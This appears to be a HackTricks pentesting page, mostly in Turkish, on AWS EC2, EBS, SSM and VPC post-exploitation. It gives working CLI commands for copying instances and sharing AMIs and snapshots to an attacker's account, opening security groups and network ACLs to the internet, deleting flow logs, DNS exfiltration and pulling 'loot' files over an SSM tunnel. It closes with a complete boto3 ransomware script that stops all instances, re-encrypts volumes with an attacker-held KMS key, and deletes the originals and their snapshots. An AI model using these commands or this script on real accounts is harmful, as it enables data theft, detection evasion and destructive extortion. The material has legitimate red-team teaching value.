# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring, VPC içindeki EC2 instance'larının gelen ve giden trafiğini instance'ların kendilerine herhangi bir şey kurma gereği olmadan çoğaltır. Bu çoğaltılmış trafik genellikle analiz ve izleme için bir ağ izinsiz giriş tespit sistemine (IDS) gönderilir.\
Bir saldırgan bunu kötüye kullanarak tüm trafiği yakalayabilir ve içinden hassas bilgiler elde edebilir:

For more information check this page:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances genellikle bazı hassas bilgiler içerir. İçeri girmek için çeşitli yollar vardır (bakınız [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Ancak içeriğin ne olduğunu kontrol etmenin bir diğer yolu **bir AMI oluşturup bundan yeni bir instance (hatta kendi hesabınızda bile) çalıştırmaktır**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, genellikle **hassas bilgiler** içerir, bu nedenle bunları kontrol etmek bu bilgileri ortaya çıkarmalıdır.\
Eğer bir **volume without a snapshot** bulursanız: **Create a snapshot** oluşturabilir ve aşağıdaki işlemleri gerçekleştirebilir veya hesabın içinde bir instance'a sadece **mount it in an instance** edebilirsiniz:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

EC2 AMI'yi doğrudan S3'e `CreateStoreImageTask` kullanarak dışa aktarın ve snapshot paylaşımı olmadan ham disk imajı elde edin. Bu, instance ağını etkilemeden tam çevrimdışı adli inceleme veya veri hırsızlığı yapılmasını sağlar.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Bir io1/io2 Multi-Attach volume'u ikinci bir instance'a bağlayın ve snapshot olmadan canlı veriyi çekmek için salt okunur (read-only) olarak mount edin. Kurban volume zaten aynı AZ içinde Multi-Attach etkinse faydalıdır.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Bir EC2 Instance Connect Endpoint oluşturun, ingress'i yetkilendirin ve yönetilen bir tünel üzerinden private instance'lara erişmek için geçici SSH anahtarları enjekte edin. Bu, public port açmadan hızlı lateral hareket yolları sağlar.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Kurban ENI'nin ikincil private IP'sini saldırganın kontrolündeki bir ENI'ye taşıyarak IP ile allowlistelenmiş güvenilir host'ları taklit edin. Belirli adreslere bağlı internal ACL'leri veya SG kurallarını atlamayı sağlar.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Bir Elastic IP'yi kurban instance'dan saldırgana yeniden ilişkilendirerek gelen trafiği yakalayın veya güvenilir public IP'lerden geliyormuş gibi görünen giden bağlantılar başlatın.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Eğer bir security group kuralı müşteri tarafından yönetilen bir prefix list'e referans veriyorsa, listeye saldırgan CIDR'leri eklemek SG'nin kendisini değiştirmeden bağlı tüm SG kurallarına erişimi sessizce genişletir.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

İzolasyona alınmış subnet'lerden çıkış erişimini geri kazanmak için gateway veya interface VPC endpoint'leri oluşturun. AWS-managed private links, data exfiltration için eksik IGW/NAT kontrollerini atlatır.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

ec2:AuthorizeSecurityGroupIngress iznine sahip bir saldırgan security group'lara inbound kurallar ekleyebilir (örneğin, 0.0.0.0/0'dan tcp:80'e izin vermek), böylece internal servisleri halka açık İnternet'e veya yetkisiz diğer ağlara açar.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
ec2:ReplaceNetworkAclEntry (veya benzeri) izinlere sahip bir saldırgan, bir subnet’in Network ACLs (NACLs) öğelerini çok izin verici hale getirmek için değiştirebilir — örneğin kritik portlarda 0.0.0.0/0'e izin vererek — tüm subnet aralığını İnternet'e veya yetkisiz ağ segmentlerine açar. Security Groups, instance başına uygulanırken, NACLs subnet düzeyinde uygulanır; bu yüzden kısıtlayıcı bir NACL'ı değiştirmek, çok daha fazla sunucuya erişimi mümkün kılarak çok daha büyük bir blast radius'a sahip olabilir.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

ec2:Delete* ve iam:Remove* izinlerine sahip bir saldırgan kritik altyapı kaynaklarını ve yapılandırmaları silebilir — örneğin key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Bu, anında hizmet kesintisine, veri kaybına ve adli kanıt kaybına yol açabilir.

Bir örnek: bir güvenlik grubunun silinmesi:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

VPC Flow Logs'u saldırgan kontrolündeki bir S3 bucket'a yönlendirerek, uzun vadeli reconnaissance için hedef hesabın dışında ağ meta verilerini (source/destination, ports) sürekli olarak toplayın.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Bir EC2'yi dışarıya hiçbir trafik çıkmayacak şekilde kilitleseniz bile, hâlâ **exfil via DNS** yapabilir.

- **VPC Flow Logs bunu kaydetmez**.
- AWS DNS loglarına erişiminiz yok.
- Bunu devre dışı bırakmak için "enableDnsSupport" parametresini false olarak ayarlayın:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Bir saldırgan, kendi kontrolündeki bir hesabın API uç noktalarına çağrı yapabilir. Cloudtrail bu çağrıları kaydeder ve saldırgan Cloudtrail loglarında exfiltrate data'yı görebilir.

### Güvenlik Grubunu Açma

Aşağıdaki gibi portları açarak ağ servislerine daha fazla erişim elde edebilirsiniz:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Bir EC2 instance'ı çalıştırıp, ECS instance'larını çalıştırmak için kullanılacak şekilde kaydederek, ardından ECS instance'larının verilerini çalmak mümkündür.

Daha fazla bilgi için [**buraya bakın**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### VPC flow logs'ı Kaldır
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Required permissions:

- `ssm:StartSession`

Komut yürütmenin yanı sıra, SSM traffic tunneling'e izin verir; bu, Security Groups veya NACLs nedeniyle ağ erişimi olmayan EC2 instance'larından pivot yapmak için kötüye kullanılabilir.
Bunun yararlı olduğu senaryolardan biri, bir [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) üzerinden özel bir EKS cluster'a pivoting yapmaktır.

> Bir oturum başlatmak için SessionManagerPlugin'in yüklü olması gerekir: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. SessionManagerPlugin'i makinenize yükleyin
2. Aşağıdaki komutla Bastion EC2'ye giriş yapın:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 AWS geçici kimlik bilgilerini [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script ile alın
4. Kimlik bilgilerini kendi makinenize `$HOME/.aws/credentials` dosyasında `[bastion-ec2]` profili olarak aktarın
5. Bastion EC2 olarak EKS'e giriş yapın:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` dosyasındaki `server` alanını `https://localhost`'a işaret edecek şekilde güncelleyin
7. Aşağıdaki şekilde bir SSM tüneli oluşturun:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` aracının trafiği artık Bastion EC2 üzerinden SSM tüneli aracılığıyla iletiliyor ve kendi makinenizden aşağıdaki komutu çalıştırarak özel EKS kümesine erişebilirsiniz:
```shell
kubectl get pods --insecure-skip-tls-verify
```
SSL bağlantıları, `--insecure-skip-tls-verify ` bayrağı (veya K8s audit araçlarındaki eşdeğeri) ayarlanmadıkça başarısız olur. Trafik güvenli AWS SSM tunnel üzerinden tünellendiği için herhangi bir MitM saldırısından korunursunuz.

Son olarak, bu teknik özel EKS kümelerine saldırmakla sınırlı değildir. Başka herhangi bir AWS servisine veya özel bir uygulamaya pivot yapmak için rastgele domainler ve portlar belirleyebilirsiniz.

---

#### Hızlı Yerel ↔️ Uzak Port Forward (AWS-StartPortForwardingSession)

Eğer sadece **EC2 instance'ından yerel host'unuza tek bir TCP portunu** yönlendirmeniz gerekiyorsa `AWS-StartPortForwardingSession` SSM dokümanını kullanabilirsiniz (uzak host parametresi gerekmez):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Komut, workstation'ınız (`localPortNumber`) ile instance üzerindeki seçili port (`portNumber`) arasında çift yönlü bir tünel oluşturur **without opening any inbound Security-Group rules**.

Yaygın kullanım durumları:

* **File exfiltration**
1. Instance üzerinde, exfiltrate etmek istediğiniz dizine işaret eden hızlı bir HTTP sunucusu başlatın:

```bash
python3 -m http.server 8000
```

2. Workstation'ınızdan SSM tüneli üzerinden dosyaları çekin:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **İç ağ web uygulamalarına erişim (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
İpucu: Exfiltrating işleminden önce kanıtları sıkıştırıp şifreleyin, böylece CloudTrail açık metin içeriğini kaydetmez:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMI Paylaşımı
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Genel ve özel AMIs'lerde hassas bilgileri ara

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel, genel veya özel Amazon Machine Images (AMIs) içinde **hassas bilgileri aramak** için tasarlanmış bir araçtır. Hedef AMIs'den instance'ları başlatma, bunların volume'larını bağlama ve olası secret'lar veya hassas veriler için tarama süreçlerini otomatikleştirir.

### EBS Snapshot Paylaşımı
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation notlarında gösterilen Ransomware demonstrasyonuna benzer bir PoC. KMS, çeşitli AWS hizmetlerini şifrelemek için kullanmasının ne kadar kolay olduğuna bağlı olarak Ransomware Management Service (RMS) olarak yeniden adlandırılmalıdır.

Önce 'attacker' AWS hesabından KMS içinde bir müşteri yönetimli anahtar oluşturun. Bu örnek için anahtar verilerini AWS'in benim için yönetmesine izin vereceğiz, ancak gerçekçi bir senaryoda kötü niyetli bir aktör anahtar verilerini AWS kontrolü dışında tutardı. Anahtar politikasını, herhangi bir AWS hesap Principal'inin anahtarı kullanmasına izin verecek şekilde değiştirin. Bu anahtar politikası için hesabın adı 'AttackSim' idi ve tüm erişime izin veren politika kuralı 'Outside Encryption' olarak adlandırıldı.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Anahtar politika kuralının bir EBS hacmini şifrelemek için kullanılabilmesi adına aşağıdakilerin etkinleştirilmesi gerekiyor:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Şimdi kullanılacak halka açık erişilebilir anahtar ile. Şifrelenmemiş EBS hacimleri bağlı bazı EC2 instances olan bir 'victim' hesabını kullanabiliriz. Bu 'victim' hesabın EBS hacimleri, şifreleme hedefimizdir; bu saldırı, yüksek ayrıcalıklı bir AWS hesabının ele geçirildiği varsayımıyla gerçekleştiriliyor.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 ransomware örneğine benzer şekilde. Bu saldırı, bağlı EBS hacimlerinin snapshot'larını alarak kopyalarını oluşturacak, yeni EBS hacimlerini şifrelemek için 'attacker' hesabından halka açık anahtarı kullanacak; ardından orijinal EBS hacimlerini EC2 instances'dan ayırıp silecek ve son olarak yeni şifrelenmiş EBS hacimlerini oluşturmak için kullanılan snapshot'ları silecek. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Bunun sonucunda hesapta yalnızca şifrelenmiş EBS hacimleri kalır.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ayrıca belirtmeye değer, script orijinal EBS hacimlerini ayırmak ve silmek için EC2 instances'ı durdurdu. Orijinal şifrelenmemiş hacimler artık yok.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Son olarak, 'attacker' hesabındaki key policy'ye geri dönün ve key policy'den 'Outside Encryption' policy kuralını kaldırın.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Yeni ayarlanmış anahtar politikasının yayılması için bir süre bekleyin. Ardından 'victim' hesabına geri dönün ve yeni şifrelenmiş EBS hacimlerinden birini bağlamayı deneyin. Hacmi bağlayabildiğinizi göreceksiniz.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ancak şifrelenmiş EBS hacmiyle EC2 instance'ını gerçekten başlatmayı denediğinizde işlem başarısız olur ve bağlı EBS hacmi artık anahtarla deşifre edilemediği için instance 'pending' durumundan 'stopped' durumuna geri döner ve orada kalır.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Bu kullanılan python scripti. Şifreleme için kullanılacak anahtarın genel olarak erişilebilir bir AWS ARN değeri ile birlikte 'victim' hesabının AWS kimlik bilgilerini (creds) alır. Script, hedef AWS hesabındaki TÜM EC2 instance'lara bağlı tüm mevcut EBS hacimlerinin şifrelenmiş kopyalarını oluşturacak, ardından tüm EC2 instance'ları durduracak, orijinal EBS hacimlerini ayıracak, bunları silecek ve süreç boyunca kullanılan tüm snapshots'ları son olarak silecektir. Bu, hedef 'victim' hesabında yalnızca şifrelenmiş EBS hacimlerinin kalmasına neden olur. SADECE BUNU BİR TEST ORTAMINDA KULLANIN, BU YIKICI BİR İŞLEMDİR VE TÜM ORİJİNAL EBS HACİMLERİNİ SİLECEKTİR. Kullanılan KMS anahtarıyla bunları kurtarabilir ve snapshots'lar aracılığıyla orijinal hallerine geri yükleyebilirsiniz, ancak günün sonunda bunun bir ransomware PoC olduğunu bilmenizi istedim.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Referanslar

- [Pentest Partners – AWS'de SSM kullanarak dosyalar nasıl transfer edilir](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
